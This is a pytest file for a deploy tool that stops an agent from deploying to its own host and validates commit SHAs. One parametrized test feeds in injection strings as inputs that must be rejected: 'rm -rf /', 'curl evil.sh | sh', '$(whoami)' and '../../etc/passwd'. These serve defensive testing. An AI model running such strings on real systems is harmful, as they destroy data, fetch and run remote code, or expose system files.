"""Targeting rules for ``hermes peer deploy``.

The first test in this file is the one that matters: an agent must not be able
to name its own host as the deploy target. Everything else in the blue-green
scheme is a convenience; that assertion is the safety property.
"""

import socket

import pytest

from hermes_cli.subcommands.peer_deploy_target import (
    DeployTargetError,
    assert_target_is_not_self,
    host_from_peer_url,
    validate_sha,
)


class TestSelfTargetIsRefused:
    """An agent must never actuate its own gateway. Config is the input."""

    @pytest.mark.parametrize("url", [
        "http://localhost:8642",
        "http://127.0.0.1:8642",
        "http://[::1]:8642",
        "127.0.0.1:8642",
    ])
    def test_loopback_in_any_spelling(self, url):
        with pytest.raises(DeployTargetError, match="never deploy itself"):
            assert_target_is_not_self("self-in-disguise", url)

    def test_own_hostname(self):
        host = socket.gethostname()
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self("me", f"http://{host}:8642")

    def test_own_mdns_name(self):
        # The .local form is how these boxes actually address each other, so a
        # peer entry pointing at our own .local must be caught by name.
        host = socket.gethostname().lower()
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self("me-local", f"http://{host}.local:8642")

    def test_unfamiliar_name_that_resolves_to_us(self, monkeypatch):
        """The ssh-alias / DNS case: the name means nothing, the address is ours.

        This is the check that a command-string regex could never make.
        """
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(mod, "_resolve", lambda h: {"192.168.4.22"})
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        with pytest.raises(DeployTargetError, match="resolves to an address"):
            assert_target_is_not_self("sneaky", "http://totally-not-me.example:8642")

    def test_name_resolving_to_loopback(self, monkeypatch):
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(mod, "_resolve", lambda h: {"127.0.0.53"})
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        with pytest.raises(DeployTargetError, match="loopback"):
            assert_target_is_not_self("aliased", "http://pretend-peer.example:8642")

    def test_extra_self_names_are_honoured(self):
        with pytest.raises(DeployTargetError, match="THIS machine"):
            assert_target_is_not_self(
                "alias", "http://ash-box:8642", extra_self_names=["ash-box"]
            )


class TestGenuinePeerIsAccepted:
    def test_a_real_peer_passes(self, monkeypatch):
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(mod, "_resolve", lambda h: {"192.168.4.100"})
        monkeypatch.setattr(mod, "_own_addresses", lambda: {"192.168.4.22"})
        assert assert_target_is_not_self("wren", "http://ha-pi.local:8642") == "ha-pi.local"

    def test_unresolvable_peer_is_allowed_through_name_checks(self, monkeypatch):
        """DNS being down must not be reinterpreted as 'target is self'.

        Failing closed here would mean a network blip blocks a rollback, which
        is the moment we most need the deploy path to work.
        """
        import hermes_cli.subcommands.peer_deploy_target as mod

        monkeypatch.setattr(mod, "_resolve", lambda h: set())
        assert assert_target_is_not_self("wren", "http://ha-pi.local:8642") == "ha-pi.local"


class TestMalformedTargets:
    @pytest.mark.parametrize("url", ["", "   ", "://"])
    def test_unparseable_url_is_refused(self, url):
        with pytest.raises(DeployTargetError):
            assert_target_is_not_self("broken", url)

    def test_host_extraction(self):
        assert host_from_peer_url("http://ha-pi.local:8642") == "ha-pi.local"
        assert host_from_peer_url("ha-pi.local:8642") == "ha-pi.local"
        assert host_from_peer_url("") is None


class TestShaValidation:
    """The SHA is interpolated into a remote git command; refuse, don't escape."""

    def test_accepts_abbreviated_and_full(self):
        assert validate_sha("60a4442") == "60a4442"
        assert validate_sha("60a4442826ee063bf39aa26ebac2af0f347cfce0").startswith("60a4442")

    def test_lowercases(self):
        assert validate_sha("60A4442") == "60a4442"

    @pytest.mark.parametrize("bad", [
        "",
        "abc",                                  # too short
        "60a4442; rm -rf /",                    # command injection
        "60a4442 && curl evil.sh | sh",
        "$(whoami)",
        "`id`",
        "main",                                 # a ref, not a SHA
        "../../etc/passwd",
        "60a4442826ee063bf39aa26ebac2af0f347cfce0a",  # too long
    ])
    def test_rejects_anything_not_hex(self, bad):
        with pytest.raises(DeployTargetError):
            validate_sha(bad)
